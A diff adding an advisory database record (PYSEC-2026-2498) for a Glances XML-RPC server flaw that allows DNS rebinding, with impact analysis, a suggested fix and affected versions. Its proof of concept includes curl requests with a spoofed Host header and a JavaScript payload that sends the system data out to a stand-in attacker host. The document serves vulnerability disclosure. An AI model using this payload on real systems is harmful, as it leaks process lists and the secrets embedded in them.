@@ -1,0 +1,198 @@
+{
+  "id": "PYSEC-2026-2498",
+  "modified": "2026-07-13T16:31:55.207039061Z",
+  "published": "2026-07-13T15:46:22.979885Z",
+  "aliases": [
+    "CVE-2026-46611",
+    "GHSA-w856-8p3r-p338"
+  ],
+  "summary": "Glances: XML-RPC Server Missing Host Header Validation Enables DNS Rebinding Attack",
+  "details": "### Summary\n\nThe Glances XML-RPC server (`glances -s`, implemented in `glances/server.py`) does not validate the HTTP `Host` header, leaving it vulnerable to DNS rebinding attacks.  CVE-2026-32632 (patched in 4.5.2) added `TrustedHostMiddleware` to the REST/WebUI server; the MCP server has had equivalent protection since 4.5.1. The XML-RPC server received neither fix and has no `allowed-hosts` configuration key.  Combined with the unrestricted `Access-Control-Allow-Origin: *` header (see companion advisory for CVE-2026-33533 and its incomplete fix), an attacker can exploit DNS rebinding to exfiltrate the full system monitoring dataset from a victim's browser.\n\n---\n\n### Details\n\n**Affected component:** `glances/server.py` — `GlancesXMLRPCHandler` / `GlancesXMLRPCServer`\n\n**Direct URL (commit 04579778e733d705898a169e049dc84772c852da):**\n- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py\n\nContrast — patched backends:\n- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_restful_api.py\n- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_mcp.py\n\nThe `GlancesXMLRPCHandler` class inherits from Python's `xmlrpc.server.SimpleXMLRPCRequestHandler` and does not override `parse_request()` to inspect or validate the `Host` header.\n\nContrast this with the two other Glances server backends, both of which received host-validation hardening:\n\n**REST / WebUI server** (`glances/outputs/glances_restful_api.py`) — patched in 4.5.2:\n\n```python\n# glances_restful_api.py\nif self.webui_allowed_hosts:\n    self._app.add_middleware(\n        TrustedHostMiddleware,\n        allowed_hosts=self.webui_allowed_hosts,\n    )\n```\n\n**MCP server** (`glances/outputs/glances_mcp.py`) — protected since 4.5.1:\n\n```python\n# glances_mcp.py\nTransportSecuritySettings(\n    allowed_hosts=self.mcp_allowed_hosts,\n    ...\n)\n```\n\n**XML-RPC server** (`glances/server.py`) — no equivalent exists:\n\n```python\nclass GlancesXMLRPCHandler(SimpleXMLRPCRequestHandler, GlancesAPI):\n    # No Host header check; any Host value is accepted\n    rpc_paths = ('/RPC2',)\n    ...\n```\n\nThere is no `xmlrpc_allowed_hosts` (or equivalent) configuration key in `glances.conf`, and the server ignores the `Host` header on every incoming request.\n\n**Confirmed on:** x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).\n\nTest results:\n\n| Server type | Host header          | HTTP status | Data returned |\n|-------------|----------------------|-------------|---------------|\n| XML-RPC     | `attacker.example.com` | 200 OK    | Yes — VULNERABLE |\n| XML-RPC     | `127.0.0.1:61209`    | 200 OK      | Yes (baseline)   |\n| REST API    | `attacker.example.com` | 400 Bad Request | No — patched |\n\n---\n\n### PoC\n\n**Attack overview**\n\nDNS rebinding breaks the browser Same-Origin Policy by making `attacker.example.com` temporarily resolve to the target's IP address (e.g. `127.0.0.1`).  From that point the victim's browser treats the attacker's page as same-origin with `http://attacker.example.com:61209/RPC2`, forwarding the attacker-controlled `Host` header to the local Glances XML-RPC server, which accepts it without validation.\n\n**Special configuration required**\n\nNo special `glances.conf` settings are needed.  The vulnerability is present in a default Glances XML-RPC server start (`glances -s`).  For the comparison test (Step 3) the REST server must also be started; that step requires Glances to be installed with web dependencies (`pip install \"glances[web]\"`).\n\n---\n\n**Step 1 — Start the Glances XML-RPC server**\n\n```bash\nglances -s -p 61209\n```\n\n**Step 2 — Confirm the server accepts an arbitrary Host header**\n\n```bash\ncurl -s -D - -X POST \"http://127.0.0.1:61209/RPC2\" \\\n     -H \"Host: attacker.example.com\" \\\n     -H \"Content-Type: text/plain\" \\\n     -d '\u003c?xml version=\"1.0\"?\u003e\n         \u003cmethodCall\u003e\u003cmethodName\u003egetAllPlugins\u003c/methodName\u003e\u003c/methodCall\u003e'\n```\n\nExpected result (secure): `HTTP/1.0 400 Bad Request`\nActual result: `HTTP/1.0 200 OK` with full XML-RPC response body.\n\n**Step 3 — Confirm the REST API is patched (comparison)**\n\n```bash\n# Start REST server with the same machine as allowed host:\nglances -w -p 61210 --webui-port 61210\n\ncurl -s -o /dev/null -w \"%{http_code}\\n\" \\\n     \"http://127.0.0.1:61210/api/4/status\" \\\n     -H \"Host: attacker.example.com\"\n# Returns: 400   (TrustedHostMiddleware rejects the spoofed Host)\n```\n\n**Step 4 — Full DNS rebinding exploitation (real-world path)**\n\n1. Attacker registers `attacker.example.com` with a low-TTL (1 second) DNS record initially pointing to their own server IP.\n2. Attacker serves the following page from `http://attacker.example.com`:\n\n```html\n\u003cscript\u003e\nasync function exfil() {\n  const payload = `\u003c?xml version=\"1.0\"?\u003e\n    \u003cmethodCall\u003e\u003cmethodName\u003egetAll\u003c/methodName\u003e\u003c/methodCall\u003e`;\n  try {\n    const r = await fetch('http://attacker.example.com:61209/RPC2', {\n      method:  'POST',\n      headers: { 'Content-Type': 'text/plain' },\n      body:    payload,\n    });\n    const data = await r.text();\n    // data contains: hostname, OS, all processes with cmd-lines, network, disk\n    await fetch('https://collect.attacker.example.com/?d=' + btoa(data));\n  } catch (_) {}\n}\n\n// Wait for TTL to expire and DNS to rebind to 127.0.0.1, then call exfil()\nsetTimeout(exfil, 5000);\n\u003c/script\u003e\n```\n\n3. Victim visits `http://attacker.example.com` in their browser.\n4. After TTL expiry, the attacker's DNS server responds with `127.0.0.1`.\n5. The browser's `fetch()` call is sent to `127.0.0.1:61209` with `Host: attacker.example.com`; the XML-RPC server accepts it.\n6. The `Access-Control-Allow-Origin: *` header (see companion advisory) allows the browser to read the response body.\n7. The attacker receives the complete system monitoring snapshot.\n\nTools that simplify DNS rebinding for research/testing include:\n- [Singularity](https://github.com/nccgroup/singularity)\n- [rbndr.us](https://rbndr.us)\n\n**Step 5 — Confirm absence of Host check in source**\n\n```python\nimport sys, inspect\nsys.path.insert(0, '/path/to/glances')   # adjust to local clone\nimport glances.server as s\n\nsrc = inspect.getsource(s.GlancesXMLRPCHandler)\nprint('Host check present:', 'allowed_hosts' in src or 'Host' in src)\n# Host check present: False\n```\n\n---\n\n### Impact\n\n**Vulnerability type:** Insufficient Verification of Data Authenticity / DNS Rebinding (CWE-350)\n\n**Who is impacted:** Any user whose browser can reach a Glances XML-RPC server and who can be lured to visit an attacker controlled web page.  This includes deployments where:\n\n- Glances is bound to `127.0.0.1` (loopback) — DNS rebinding bypasses the loopback restriction.\n- Glances is bound to a LAN IP — any browser on that LAN is at risk.\n- Glances is exposed on a public IP — any browser on the internet is at risk.\n\n**Data exposed through the XML-RPC API** includes: hostname, OS and kernel version, full process list with command-line arguments (frequently containing API keys, database passwords, and access tokens passed as environment variables or CLI flags), CPU/memory/disk/network statistics, open file descriptors, listening ports, and Docker/Kubernetes container metadata.\n\n**Impact:**\n- **Confidentiality:** High — complete system monitoring data readable remotely without credentials.\n- **Integrity:** None — read-only XML-RPC API.\n- **Availability:** None — no denial-of-service component.\n\nThe attack is amplified by the companion CORS wildcard issue (vuln03): without `Access-Control-Allow-Origin: *`, the browser would still block the response read.  Both issues must be fixed together for effective remediation.\n\n---\n\n### Suggested Fix\n\n**Option 1 — Add Host validation to the XML-RPC handler (preferred)**\n\nAdd a `webui_allowed_hosts` (or new `xmlrpc_allowed_hosts`) configuration key, and validate the `Host` header in `GlancesXMLRPCHandler`:\n\n```python\n# server.py\nclass GlancesXMLRPCHandler(SimpleXMLRPCRequestHandler, GlancesAPI):\n\n    allowed_hosts: list[str] = []   # populated from config\n\n    def parse_request(self) -\u003e bool:\n        if not super().parse_request():\n            return False\n        if self.allowed_hosts:\n            host = self.headers.get('Host', '').split(':')[0]\n            if host not in self.allowed_hosts:\n                self.send_error(400, 'Bad Request: invalid Host header')\n                return False\n        return True\n```\n\nPopulate `allowed_hosts` from the existing `webui_allowed_hosts` config key (already used by the REST server), so operators have a single knob.\n\n**Option 2 — Deprecate and remove the XML-RPC server**\n\nThe XML-RPC server is a legacy interface.  The REST API (`glances -w`) provides a superset of functionality, is actively maintained, and has all current security controls.  Deprecating the XML-RPC server in the next major release and directing users to the REST API would eliminate this attack surface entirely.\n\n---\n\n### Responsible Disclosure\nThe AFINE Team is committed to responsible / coordinated disclosure.  The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first. \n---\n\n### Credits\n\nThis issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.\n\n---",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "glances",
+        "purl": "pkg:pypi/glances"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.5.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.3.1",
+        "1.3.2",
+        "1.3.3",
+        "1.3.4",
+        "1.3.5",
+        "1.3.6",
+        "1.3.7",
+        "1.4",
+        "1.4.1",
+        "1.4.1.1",
+        "1.4.2",
+        "1.4.2.1",
+        "1.5",
+        "1.5.1",
+        "1.5.2",
+        "1.6",
+        "1.6.1",
+        "1.7",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.7.7",
+        "2.0",
+        "2.0.1",
+        "2.1",
+        "2.1.1",
+        "2.1.2",
+        "2.10",
+        "2.11",
+        "2.11.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "2.4.2",
+        "2.5",
+        "2.5.1",
+        "2.6",
+        "2.6.1",
+        "2.6.2",
+        "2.7",
+        "2.7.1",
+        "2.8",
+        "2.8.1",
+        "2.8.2",
+        "2.8.3",
+        "2.8.4",
+        "2.8.5",
+        "2.8.6",
+        "2.8.7",
+        "2.8.8",
+        "2.9.0",
+        "2.9.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1.0",
+        "3.1.1",
+        "3.1.2",
+        "3.1.3",
+        "3.1.4",
+        "3.1.4.1",
+        "3.1.5",
+        "3.1.6",
+        "3.1.6.1",
+        "3.1.6.2",
+        "3.1.7",
+        "3.2.0",
+        "3.2.1",
+        "3.2.2",
+        "3.2.3",
+        "3.2.3.1",
+        "3.2.4",
+        "3.2.4.1",
+        "3.2.4.2",
+        "3.2.5",
+        "3.2.6.1",
+        "3.2.6.2",
+        "3.2.6.3",
+        "3.2.6.4",
+        "3.2.7",
+        "3.3.0",
+        "3.3.0.1",
+        "3.3.0.2",
+        "3.3.0.3",
+        "3.3.0.4",
+        "3.3.1",
+        "3.3.1.1",
+        "3.4.0",
+        "3.4.0.1",
+        "3.4.0.2",
+        "3.4.0.3",
+        "3.4.0.4",
+        "3.4.0.5",
+        "4.0.1",
+        "4.0.2",
+        "4.0.3",
+        "4.0.4",
+        "4.0.5",
+        "4.0.6",
+        "4.0.7",
+        "4.0.8",
+        "4.1.0",
+        "4.1.1",
+        "4.1.2",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "4.3.0.1",
+        "4.3.0.3",
+        "4.3.0.4",
+        "4.3.0.5",
+        "4.3.0.6",
+        "4.3.0.7",
+        "4.3.0.8",
+        "4.3.1",
+        "4.3.2",
+        "4.3.3",
+        "4.4.0",
+        "4.4.1",
+        "4.5.0",
+        "4.5.0.1",
+        "4.5.0.2",
+        "4.5.0.3",
+        "4.5.0.4",
+        "4.5.0.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/pypa/advisory-database/blob/main/vulns/glances/PYSEC-2026-2498.yaml"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/nicolargo/glances/security/advisories/GHSA-w856-8p3r-p338"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/nicolargo/glances"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nicolargo/glances/releases/tag/v4.5.5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/glances"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-w856-8p3r-p338"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-46611"
+    }
+  ]
+}
